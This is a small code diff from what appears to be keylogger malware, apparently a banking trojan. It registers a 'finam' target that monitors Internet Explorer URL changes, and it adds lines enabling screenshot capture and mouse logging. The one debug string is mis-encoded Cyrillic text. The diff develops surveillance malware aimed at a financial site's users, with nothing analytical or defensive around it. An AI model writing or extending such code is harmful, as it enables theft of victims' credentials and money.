@@ -64,6 +64,8 @@ bool Init()
 	System = KeyLogger::AddSystem( "finam", PROCESS_HASH_IE );
 	if( System )
 	{
+		System->MakeScreenShot = true;;
+		System->AlwaysLogMouse = LOG_MOUSE_NOT_SCREENSHOT;
 		DBG( "finam", "ќжидаем нужный урл" );
 		KeyLogger::ConnectEventHandler( KLE_IE_URL_CHANGED, URLChanged );
 		return true;
